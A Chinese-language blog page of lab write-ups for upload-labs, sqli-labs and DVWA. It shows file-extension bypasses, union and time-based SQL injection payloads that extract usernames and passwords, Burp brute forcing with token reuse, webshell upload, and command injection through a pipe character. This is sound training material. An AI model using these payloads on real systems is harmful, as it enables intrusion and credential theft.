<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  
  <title>Hexo</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
  <meta property="og:type" content="website">
<meta property="og:title" content="Hexo">
<meta property="og:url" content="http://example.com/page/2/index.html">
<meta property="og:site_name" content="Hexo">
<meta property="og:locale" content="en_US">
<meta property="article:author" content="John Doe">
<meta name="twitter:card" content="summary">
  
    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
  
  
    <link rel="shortcut icon" href="/favicon.png">
  
  
  
<link rel="stylesheet" href="/css/style.css">

  
    
<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">

  
  
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/fork-awesome@1.2.0/css/fork-awesome.min.css">

<meta name="generator" content="Hexo 7.3.0"></head>

<body>
  <div id="container">
    <div id="wrap">
      <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <h1 id="logo-wrap">
        <a href="/" id="logo">Hexo</a>
      </h1>
      
    </div>
    <div id="header-inner" class="inner">
      <nav id="main-nav">
        <a id="main-nav-toggle" class="nav-icon"><span class="fa fa-bars"></span></a>
        
          <a class="main-nav-link" href="/">Home</a>
        
          <a class="main-nav-link" href="/archives">Archives</a>
        
      </nav>
      <nav id="sub-nav">
        
        
          <a class="nav-icon" href="/atom.xml" title="RSS Feed"><span class="fa fa-rss"></span></a>
        
        <a class="nav-icon nav-search-btn" title="Search"><span class="fa fa-search"></span></a>
      </nav>
      <div id="search-form-wrap">
        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
      </div>
    </div>
  </div>
</header>

      <div class="outer">
        <section id="main">
  
    <article id="post-Web/文件上传/upload-labs/空格点绕过" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2025/05/20/Web/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/upload-labs/%E7%A9%BA%E6%A0%BC%E7%82%B9%E7%BB%95%E8%BF%87/" class="article-date">
  <time class="dt-published" datetime="2025-05-20T00:55:56.000Z" itemprop="datePublished">2025-05-20</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="空格点绕过"><a href="#空格点绕过" class="headerlink" title="空格点绕过"></a>空格点绕过</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pht&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>,<span class="string">&quot;.htaccess&quot;</span>);</span><br><span class="line">        <span class="variable">$file_name</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        <span class="variable">$file_name</span> = <span class="title function_ invoke__">deldot</span>(<span class="variable">$file_name</span>);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">strrchr</span>(<span class="variable">$file_name</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">strtolower</span>(<span class="variable">$file_ext</span>); <span class="comment">//转换为小写</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$file_ext</span>);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$file_ext</span>); <span class="comment">//首尾去空</span></span><br><span class="line">    </span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">in_array</span>(<span class="variable">$file_ext</span>, <span class="variable">$deny_ext</span>)) &#123;</span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$file_name</span>;</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123;</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;此文件类型不允许上传！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>可以用点空格点来绕过，<kbd>$img_path = UPLOAD_PATH.&#39;/&#39;.$file_name;</kbd>​因为加载的是文件名字，检测的是文件后缀</p>
</blockquote>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2025/05/20/Web/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/upload-labs/%E7%A9%BA%E6%A0%BC%E7%82%B9%E7%BB%95%E8%BF%87/" data-id="cmaxy8gch003qkg7kduy4a3j2" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-Web/文件上传/upload-labs/文件类型绕过" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2025/05/20/Web/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/upload-labs/%E6%96%87%E4%BB%B6%E7%B1%BB%E5%9E%8B%E7%BB%95%E8%BF%87/" class="article-date">
  <time class="dt-published" datetime="2025-05-20T00:55:56.000Z" itemprop="datePublished">2025-05-20</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="文件类型绕过"><a href="#文件类型绕过" class="headerlink" title="文件类型绕过"></a>文件类型绕过</h1><blockquote>
<p>1.还是打开抓包工具，上传一句话木马，发现是上传成功了，说明是后端验证的</p>
</blockquote>
<blockquote>
<p>2.通过content-type判断文件类型</p>
</blockquote>
<p><img src="/.com//image-20250119174443-twfakc5.png" alt="image"></p>
<h1 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h1><blockquote>
<p>上传一句话木马php，然后把content-type的验证改为jpg的可以放行</p>
</blockquote>
<h1 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h1><blockquote>
<p>上传更改过后的一句话木马，上传jpg后缀的，然后burp改为php放行</p>
</blockquote>
<p>‍</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2025/05/20/Web/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/upload-labs/%E6%96%87%E4%BB%B6%E7%B1%BB%E5%9E%8B%E7%BB%95%E8%BF%87/" data-id="cmaxy8gch003rkg7k81vs2hlo" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-Web/注入漏洞/SQL注入/sql注入靶场/sql——labs" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2025/05/20/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/SQL%E6%B3%A8%E5%85%A5/sql%E6%B3%A8%E5%85%A5%E9%9D%B6%E5%9C%BA/sql%E2%80%94%E2%80%94labs/" class="article-date">
  <time class="dt-published" datetime="2025-05-20T00:55:56.000Z" itemprop="datePublished">2025-05-20</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="sql——labs"><a href="#sql——labs" class="headerlink" title="sql——labs"></a>sql——labs</h1><h1 id="Less—1"><a href="#Less—1" class="headerlink" title="Less—1"></a>Less—1</h1><p>字符型包裹为 ‘’</p>
<h1 id="Less—2"><a href="#Less—2" class="headerlink" title="Less—2"></a>Less—2</h1><p>数字型无包裹</p>
<h1 id="Less—3"><a href="#Less—3" class="headerlink" title="Less—3"></a>Less—3</h1><p>字符括号包裹（’’）</p>
<h1 id="Less—4"><a href="#Less—4" class="headerlink" title="Less—4"></a>Less—4</h1><p>字符双引号括号包裹（””）</p>
<h1 id="Less—5"><a href="#Less—5" class="headerlink" title="Less—5"></a>Less—5</h1><p>布尔盲注</p>
<blockquote>
<p><strong>1.left函数：</strong> select left(database(),1)&#x3D;’s’;  left(a,b)从左侧截取a的前b位，正确则返回，错误返回</p>
<p><strong>2.regexp函数：</strong> select user() regexp ‘r’;   user()的结果是root，regexp为匹配root的正则表达式</p>
<p><strong>3.like函数：</strong> select user() like ‘ro%’;	 匹配与regexp相似</p>
<p><strong>4.substr(a,b,c):</strong>  select substr() XXXX;     substr(a,b,c)从位置b开始，截取a字符串c位长度  select substr((select database()),1,1)&#x3D;’s’;</p>
<p><strong>5.ascii:</strong></p>
<p><strong>6.chr(‘数字’)  ord(‘字母’)</strong>  			   python中转换ascii值</p>
</blockquote>
<p>‍</p>
<h1 id="Less——7"><a href="#Less——7" class="headerlink" title="Less——7"></a>Less——7</h1><blockquote>
<p>补充知识点</p>
<p>​<code>show variables like &#39;%secure%&#39;;</code>​查看secure-file-priv当前的值，如果显示为NULL，则需要打开，：\phpstudy\PHPTutorial\MySQL\my.ini文件，在其中加上一句：secure file priv&#x3D;”&#x2F;”。</p>
<p>而且要先设置secure_file_priv&#x3D;,如果它为空则可以指定任意目录，如果设置等于某个路径就只能在这个指定路径下，而它为NULL则禁止导入导出功能</p>
<p>​<code>load_file()</code>​读取本地文件<code>select load_file(&#39;D:\\ctf_all\\phpstudy_pro\\WWW\\sqli-labs\\Less-7&#39;)</code>​</p>
<p>​<code>into outfile</code>​写文件    用法：<code>select &#39;mysql is very good&#39; into outfile &#39;test1.txt&#39;;</code>​</p>
<pre><code>				文件位置： 是在sql版本下的data文件中
</code></pre>
<p>我们要写到绝对位置那就，双反斜线是因为\t这种类型被转义掉了</p>
<p>​<code>select &#39;a&#39; into outfile &#39;D:\\ctf_all\\phpstudy_pro\\WWW\\sqli-labs\\Less-7\\tsxt.txt&#39;；</code>​</p>
<p><span data-type="text" style="background-color: var(--b3-card-error-background); color: var(--b3-card-error-color);">！！！注意sql语句中\需要转译</span></p>
</blockquote>
<p>‍</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2025/05/20/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/SQL%E6%B3%A8%E5%85%A5/sql%E6%B3%A8%E5%85%A5%E9%9D%B6%E5%9C%BA/sql%E2%80%94%E2%80%94labs/" data-id="cmaxy8gcj003ykg7kh2ykgbem" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-Web/注入漏洞/SQL注入/sql注入总结/union 注入" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2025/05/20/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/SQL%E6%B3%A8%E5%85%A5/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/union%20%E6%B3%A8%E5%85%A5/" class="article-date">
  <time class="dt-published" datetime="2025-05-20T00:55:56.000Z" itemprop="datePublished">2025-05-20</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="union-注入"><a href="#union-注入" class="headerlink" title="union 注入"></a>union 注入</h1><h3 id="一、原理及手工注入"><a href="#一、原理及手工注入" class="headerlink" title="一、原理及手工注入"></a>一、原理及手工注入</h3><hr>
<p>三个条件：</p>
<ol>
<li>两个表的<code>列数相同</code>​，并且相应的列具有<code>相似的数据类型</code>​。</li>
<li>查询结果<code>回显</code>​。</li>
<li>存在注入漏洞。</li>
</ol>
<p>我们可以通过<code>order by</code>​来判断当前表的列数。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.209.128:88/Less-1/?id=1&#x27;  order by 4-- qwq</span><br></pre></td></tr></table></figure>

<p>4 时错误，3 时正确，可得知，当前表有 3 列</p>
<p><img src="/.com//image-20250519090453-q9nevqk.png" alt="image"></p>
<p><img src="/.com//image-20250519090456-ziat5np.png" alt="image"></p>
<p>通过union union查询来知道显示的列数。</p>
<p>​<code>http://192.168.209.128:88/Less-1/?id=-1&#39; union select 1 ,2 ,3 -- qwq</code>​</p>
<p><img src="/.com//image-20250519091423-lg6slw8.png" alt="image"></p>
<p>我们union查询的就显示出来了。可知，第 2 列和第 3 列是回显列。那我们就可以在这两个位置插入一些函数了。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">version():查询数据库的版本</span><br><span class="line">user():查询数据库的使用者</span><br><span class="line">database():数据库</span><br><span class="line">system_user():系统用户名</span><br><span class="line">session_user():连接数据库的用户名</span><br><span class="line">current_user:当前用户名</span><br><span class="line">load_file:读取本地文件</span><br><span class="line">@@datadir:读取数据库路径</span><br><span class="line">@@basedir:mysql安装路径</span><br><span class="line">@@version_complie_os:查看操作系统</span><br></pre></td></tr></table></figure>

<p>开始注入脚本</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">//回显出数据库版本信息、数据库所在路径</span><br><span class="line">http://192.168.209.128:88/Less-1/?<span class="built_in">id</span>=-1<span class="string">&#x27; union select 1,version(),@@datadir -- qwq</span></span><br><span class="line"><span class="string">//更多自行尝试</span></span><br><span class="line"><span class="string">。。。。。。</span></span><br></pre></td></tr></table></figure>

<p><img src="/.com//image-20250519091530-mom8i84.png" alt="image"></p>
<p>我们还可以通过 union 注入获得更多的信息。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">// 获得所有的数据库</span><br><span class="line">http://127.0.0.1/sqli/Less-1/?<span class="built_in">id</span>=-1<span class="string">&#x27; union select 1,group_concat(schema_name),3 from information_schema.schemata --+</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">// 获得所有的表</span></span><br><span class="line"><span class="string">http://127.0.0.1/sqli/Less-1/?id=-1&#x27;</span> union <span class="keyword">select</span> 1,group_concat(table_name),3 from information_schema.tables--+</span><br><span class="line"></span><br><span class="line">// 获得所有的列</span><br><span class="line">http://127.0.0.1/sqli/Less-1/?<span class="built_in">id</span>=-1<span class="string">&#x27; union select 1,group_concat(column_name),3 from information_schema.columns --+</span></span><br></pre></td></tr></table></figure>

<p>通过select 1,database(),3…，得出当前数据库名security，我们就可以通过下面的语句得到当前数据库的所有的表。</p>
<p>​<code>http://127.0.0.1/sqli/Less-1/?id=-1&#39; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=&#39;security&#39; -- +</code>​</p>
<p><img src="/.com//image-20250519091738-nbcnr9w.png" alt="image"></p>
<p>我们知道了当前数据库中存在了四个表，那么我们可以通过下面的语句知道每个表中的列。</p>
<p>​<code>http://127.0.0.1/sqli/Less-1/?id=-1&#39; union select 1,group_concat(column_name),3 from information_schema.columns where table_schema=&#39;security&#39; and table_name=&#39;users&#39; -- +</code>​</p>
<p>如下，我们可以知道 users 表中有 id，username，password 三列</p>
<p><img src="/.com//image-20250519091812-sx9wpg1.png" alt="image"></p>
<p>使用 group_concat()拼接账号密码还有 id，即可爆出所有数据</p>
<p>​<code>http://127.0.0.1/sqli/Less-1/?id=-1&#39; union select 1,group_concat(id,&#39;--&#39;,username,&#39;--&#39;,password),3 from users -- +</code>​</p>
<p><img src="/.com//image-20250519091835-7te350s.png" alt="image"></p>
<h2 id><a href="#" class="headerlink" title></a></h2>
      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2025/05/20/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/SQL%E6%B3%A8%E5%85%A5/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/union%20%E6%B3%A8%E5%85%A5/" data-id="cmaxy8gcn004ckg7kefah5kb2" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-Web/注入漏洞/SQL注入/sql注入总结/时间盲注" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2025/05/20/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/SQL%E6%B3%A8%E5%85%A5/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8/" class="article-date">
  <time class="dt-published" datetime="2025-05-20T00:55:56.000Z" itemprop="datePublished">2025-05-20</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h1><p>​<code>Timing Attack注入，也就是时间盲注</code>​。通过简单的条件语句比如 and 1=2 是无法看出异常的。</p>
<p>在MySQL中，有一个<code>Benchmark()</code>​函数，它是用于测试性能的。Benchmark(count,expr) ，这个函数执行的结果，是将表达式 expr 执行 count 次 。</p>
<p>因此，利用benchmark函数，可以让同一个函数执行若干次，使得结果返回的时间比平时要长，通过时间长短的变化，可以判断注入语句是否执行成功。这是一种边信道攻击，这个技巧在盲注中被称为<code>Timing Attack</code>​，也就是时间盲注。</p>
<p>利用前提：<u><strong>页面上没有显示位</strong></u>​<u>，</u>​<u><strong>也没有输出 SQL 语句执行错误信息</strong></u>​<u>。</u>​<u><strong>正确的 SQL 语句和错误的 SQL 语句返回页面都一样</strong></u>​<u>，</u>​<u><strong>但是加入 sleep(5)条件之后</strong></u>​<u>，</u>​<u><strong>页面的返回速度明显慢了 5 秒</strong></u>​<u>。</u></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">//判断是否存在延时注入</span><br><span class="line">?<span class="built_in">id</span>=1<span class="string">&#x27; and sleep(5) --+</span></span><br></pre></td></tr></table></figure>

<p>‍</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2025/05/20/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/SQL%E6%B3%A8%E5%85%A5/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8/" data-id="cmaxy8gcw0052kg7k1g1s1wdw" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-Web/DVWA靶场通关" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2025/05/20/Web/DVWA%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/" class="article-date">
  <time class="dt-published" datetime="2025-05-20T00:55:54.000Z" itemprop="datePublished">2025-05-20</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="DVWA靶场通关"><a href="#DVWA靶场通关" class="headerlink" title="DVWA靶场通关"></a>DVWA靶场通关</h1><h2 id="1-暴力破解-brute-force"><a href="#1-暴力破解-brute-force" class="headerlink" title="1.暴力破解 brute force"></a>1.暴力破解 brute force</h2><h3 id="low"><a href="#low" class="headerlink" title="low"></a>low</h3><blockquote>
<p>使用bp抓包，分别在username和password处添加变量，使用集束炸弹（cluster bomb）模式，添加字典进行爆破</p>
</blockquote>
<p><img src="/.com//0c1252a336f1a19d4a0c461a2625dfbd-20250425163154-kusite3.png" alt="0c1252a336f1a19d4a0c461a2625dfbd"></p>
<p><img src="/.com//6a77d729ad1c18c986d038672540d012-20250425164624-cuo7973.png" alt="6a77d729ad1c18c986d038672540d012"></p>
<p>可以手工SQL注入（万能密码），在用户名框中输入admin’ or ‘1’=‘1，任意输入密码即可登陆（同时在弱口令字典里也有该语句）</p>
<h3 id="Medium"><a href="#Medium" class="headerlink" title="Medium"></a>Medium</h3><p> 和low相比，过滤了一些转义字符，但依旧可以使用bp爆破方法同low</p>
<p><img src="/.com//b25d2a1090203c32d0788cdd25e2dcdc-20250425164628-ohxr4rn.png" alt="b25d2a1090203c32d0788cdd25e2dcdc"></p>
<h3 id="High"><a href="#High" class="headerlink" title="High"></a>High</h3><p> 随意输入用户名密码，抓个包可以看到，携带了token</p>
<p><img src="/.com//b25d2a1090203c32d0788cdd25e2dcdc-20250425164628-ohxr4rn.png" alt="b25d2a1090203c32d0788cdd25e2dcdc-1"></p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">GET /vulnerabilities/brute/?username=123&amp;password=123&amp;Login=Login&amp;user_token=bd32cb5998988f7c2f041f82f0dd701c HTTP/1.1</span><br><span class="line">Host: 69044566-74ca-4a40-bab8-8275aae0037d.node5.buuoj.cn:81</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:137.0) Gecko/20100101 Firefox/137.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate, br</span><br><span class="line">Connection: close</span><br><span class="line">Referer: http://69044566-74ca-4a40-bab8-8275aae0037d.node5.buuoj.cn:81/vulnerabilities/brute/</span><br><span class="line">Cookie: PHPSESSID=76shf76ao4uqleikshlanj6eh0; security=high</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Priority: u=0, i</span><br></pre></td></tr></table></figure>

<blockquote>
<p>发送到Intruder，攻击类型选择交叉攻击Pitchfork，给password和token添加payload位置</p>
</blockquote>
<p><img src="/.com//image-20250425164433-gi0ryza.png" alt="image"></p>
<p><img src="/.com//image-20250425164358-rpkpeox.png" alt="image"></p>
<p>然后token选择递归提取，并且把初始可用的token代入</p>
<p><img src="/.com//image-20250425164754-z5wbyc4.png" alt="image"></p>
<p><img src="/.com//image-20250425164835-vvz11kl.png" alt="image"></p>
<p>然后开始攻击即可</p>
<p>‍</p>
<h2 id="Command-Injection"><a href="#Command-Injection" class="headerlink" title="Command Injection"></a>Command Injection</h2><h3 id="Low"><a href="#Low" class="headerlink" title="Low"></a>Low</h3><p>网站提示我们输入ip地址</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">if( isset( $_POST[ &#x27;Submit&#x27; ]  ) ) &#123;</span><br><span class="line">    // Get input</span><br><span class="line">    $target = $_REQUEST[ &#x27;ip&#x27; ];</span><br><span class="line"></span><br><span class="line">    // Determine OS and execute the ping command.</span><br><span class="line">    if( stristr( php_uname( &#x27;s&#x27; ), &#x27;Windows NT&#x27; ) ) &#123;</span><br><span class="line">        // Windows</span><br><span class="line">        $cmd = shell_exec( &#x27;ping  &#x27; . $target );//函数能执行系统命令</span><br><span class="line">    &#125;</span><br><span class="line">    else &#123;</span><br><span class="line">        // *nix</span><br><span class="line">        $cmd = shell_exec( &#x27;ping  -c 4 &#x27; . $target );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // Feedback for the end user</span><br><span class="line">    echo &quot;&lt;pre&gt;&#123;$cmd&#125;&lt;/pre&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt; </span><br></pre></td></tr></table></figure>

<blockquote>
<p>这里我们要说一下命令连接符<br>&amp; ：前面一个命令无论是否执行，后面的命令都能执行，两个命令都执行<br>&amp;&amp;：前面一个命令执行成功后，才能执行后面一个命令，两个命令都执行<br>|：前面一个命令无论是否执行，后面的命令都能执行且只执行后面一个<br>||：前面一个命令不能正常执行后，才能执行后面一个命令</p>
<p>我们使用“|”符号作为连接符让计算机做出除ping以外的操作实现命令注入<br>结果显示注入成功！<br>命令：127.0.0.1 | dir</p>
</blockquote>
<p>‍</p>
<h3 id="Medium-1"><a href="#Medium-1" class="headerlink" title="Medium"></a>Medium</h3><p> 直接分析源码看看和Low等级有什么区别<br> 源码分析：发现在Low等级源码的基础上添加了一个黑名单，把‘&amp;&amp;’字符和‘;’字符过滤掉了，但我们可以使用黑名单之外的命令连接符继续命令注入</p>
